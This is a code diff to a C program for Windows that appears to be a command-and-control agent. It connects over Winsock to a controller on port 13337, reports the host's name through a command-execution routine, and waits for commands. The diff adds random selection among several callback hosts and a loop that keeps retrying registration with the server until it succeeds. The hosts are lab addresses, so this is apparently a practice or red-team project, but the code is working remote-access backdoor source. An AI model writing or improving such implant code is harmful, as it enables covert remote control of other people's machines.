@@ -1,13 +1,33 @@
 #include <stdio.h>
+#include <time.h>
 #include <winsock2.h>
 #include <windows.h>
 
 
-#define LEN_MSG 512
-#define HOST "192.168.56.1"
+
+#ifndef HOST
+#define HOST "127.0.0.1"
+#endif
+
+#ifndef HOSTS
+#define HOSTS {"127.0.0.1", "192.168.56.1"}
+#endif
+
+#ifndef HOST_AMOUNT
+#define HOST_AMOUNT 2
+#endif
+
+#ifndef PORT
 #define PORT 13337
+#endif
+
+#ifndef SLEEPTIME
 #define SLEEPTIME 2000
+#endif
+
+#define LEN_MSG 512
 #define LEN_ID 36
+
 
 
 SOCKET connectToServer() {
@@ -24,9 +44,13 @@ SOCKET connectToServer() {
         return SOCKET_ERROR;
     }
 
+    char hosts[HOST_AMOUNT][15] = HOSTS;
+    int randomHost = rand() % HOST_AMOUNT;
+    printf("Using host: %d (%s)\n", randomHost, hosts[randomHost]);
+
     serverHost.sin_family = AF_INET;
     serverHost.sin_port = htons(PORT);  // to little endian
-    serverHost.sin_addr.s_addr = inet_addr(HOST);
+    serverHost.sin_addr.s_addr = inet_addr(hosts[randomHost]);
 
     int result = connect(serverSocketFd, (SOCKADDR *) &serverHost, sizeof(serverHost));
     if (result == SOCKET_ERROR) {
@@ -150,6 +174,8 @@ char* execute(char* command) {
 
 
 int main() {
+    srand(time(NULL));
+    
     char agent_id[LEN_ID + 2] = "f0f0f0f0-f0f0-f0f0-f0f0-f0f0f0f0f0f0:";
     char* hostname_h = execute("hostname");
 
@@ -160,11 +186,13 @@ int main() {
     strncpy(intro_h + LEN_ID + 1, hostname_h, strlen(hostname_h));
     intro_h[intro_h_size] = 0x00;
 
-    int error = sendAndGetResponse(intro_h, agent_id);
-    if (error != 0) {
-        printf("Error while introducing ourselves. (%d)", error);
-        exit(EXIT_FAILURE);
+    while (strcmp(agent_id, "f0f0f0f0-f0f0-f0f0-f0f0-f0f0f0f0f0f0:") == 0) {
+        int error = sendAndGetResponse(intro_h, agent_id);
+        if (error != 0) {
+            printf("Error while introducing ourselves. (%d) Retrying", error);
+        }
     }
+    
 
     free(hostname_h);
     hostname_h = NULL;
